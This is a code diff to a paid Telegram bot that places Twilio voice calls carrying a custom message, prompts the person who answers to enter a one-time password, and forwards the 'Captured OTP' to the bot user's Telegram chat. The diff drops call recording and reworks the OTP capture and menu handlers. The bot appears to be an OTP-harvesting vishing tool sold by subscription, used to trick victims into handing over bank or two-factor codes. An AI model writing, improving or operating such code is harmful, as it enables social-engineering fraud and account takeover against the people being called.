@@ -7,7 +7,6 @@ from datetime import datetime, timedelta, timezone
 from urllib.parse import quote
 import json
 
-import requests
 from flask import Flask, request, Response
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -60,6 +59,7 @@ def load_paid_users():
         log.info("Loaded paid users from JSON")
     except FileNotFoundError:
         log.warning("paid_users.json not found. Starting with default seeded user.")
+        # Seeded user
         paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
         save_paid_users()
 
@@ -131,7 +131,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "1. Tap *📱 Set Phone* to save your number.\n"
                 "2. Tap *📞 Make Call* and enter your custom message.\n"
                 "3. The bot will call you and capture the OTP.\n"
-                "4. Receive OTP text and voice recording directly in Telegram ✅"
+                "4. You’ll get the OTP back in this chat ✅"
             ),
             parse_mode="Markdown",
             reply_markup=get_main_keyboard(update.effective_user.id)
@@ -210,8 +210,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             url=f"{base}/voice?msg={quote(text)}",
             status_callback=f"{base}/call_status",
             status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
-            status_callback_method='POST',
-            record=True  # <<< enable call recording
+            status_callback_method='POST'
         )
         await update.message.reply_text(f"📞 Calling {phone} now with your message...")
         return
@@ -234,8 +233,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             url=f"{base}/voice?msg={quote(last_message[uid])}",
             status_callback=f"{base}/call_status",
             status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
-            status_callback_method='POST',
-            record=True
+            status_callback_method='POST'
         )
         await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")
 
@@ -245,7 +243,7 @@ application.add_handler(CallbackQueryHandler(handle_buttons))
 application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
 # -------------------------
-# Flask
+# Flask server
 # -------------------------
 flask_app = Flask(__name__)
 
@@ -267,6 +265,9 @@ def telegram_webhook():
         log.exception("webhook error: %s", e)
         return "OK", 200
 
+# -------------------------
+# Voice / OTP capture
+# -------------------------
 @flask_app.route("/voice", methods=["POST", "GET"])
 def voice():
     message = request.args.get("msg", "Please enter your OTP now.")
@@ -283,33 +284,27 @@ def voice():
 def capture():
     otp = request.values.get("Digits") or request.values.get("SpeechResult")
     to_number = request.values.get("To")
-    recording_url = request.values.get("RecordingUrl")  # Twilio recording
-    chat_id = phone_to_chat.get(to_number)
-    log.info("Twilio /capture To=%s OTP=%s Recording=%s", to_number, otp, recording_url)
+    log.info("Twilio /capture To=%s OTP=%s Recording=%s", to_number, otp, request.values.get("RecordingUrl"))
 
-    if chat_id:
-        try:
-            if otp:
-                fut = asyncio.run_coroutine_threadsafe(
-                    application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
-                    bot_loop
-                )
-                fut.result(timeout=5)
-
-            if recording_url:
-                fut = asyncio.run_coroutine_threadsafe(
-                    application.bot.send_voice(chat_id=chat_id, voice=recording_url+".mp3"),
-                    bot_loop
-                )
-                fut.result(timeout=5)
-
-            fut = asyncio.run_coroutine_threadsafe(
-                application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(uid)),
-                bot_loop
-            )
-            fut.result(timeout=5)
-        except Exception:
-            log.exception("Failed to send OTP or recording to Telegram")
+    if to_number and otp:
+        captured_otp[to_number] = otp
+        chat_id = phone_to_chat.get(to_number)
+        if chat_id:
+            user_id = next((k for k, v in user_phone.items() if v == to_number), None)
+            if user_id:
+                try:
+                    fut = asyncio.run_coroutine_threadsafe(
+                        application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
+                        bot_loop
+                    )
+                    fut.result(timeout=5)
+                    fut = asyncio.run_coroutine_threadsafe(
+                        application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(user_id)),
+                        bot_loop
+                    )
+                    fut.result(timeout=5)
+                except Exception:
+                    log.exception("Failed to send OTP or menu to Telegram")
 
     resp = VoiceResponse()
     resp.say("Thanks! Your OTP has been captured. Goodbye!")
@@ -335,15 +330,20 @@ def call_status():
             fut = asyncio.run_coroutine_threadsafe(application.bot.send_message(chat_id=chat_id, text=msg), bot_loop)
             fut.result(timeout=5)
             if call_status_val == "completed":
-                fut = asyncio.run_coroutine_threadsafe(
-                    application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(uid)),
-                    bot_loop
-                )
-                fut.result(timeout=5)
+                user_id = next((k for k, v in user_phone.items() if v == to_number), None)
+                if user_id:
+                    fut = asyncio.run_coroutine_threadsafe(
+                        application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(user_id)),
+                        bot_loop
+                    )
+                    fut.result(timeout=5)
         except Exception:
-            log.exception("Failed to send call status to Telegram")
+            log.exception("Failed to send call status or menu to Telegram")
     return ("", 204)
 
+# -------------------------
+# Payment
+# -------------------------
 @flask_app.route("/success")
 def payment_success():
     user_id = request.args.get("user_id")
@@ -383,6 +383,7 @@ def bot_loop_thread():
     log.info("Bot loop running.")
     bot_loop.run_forever()
 
+# Start bot loop
 bot_loop = None
 t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
 t.start()
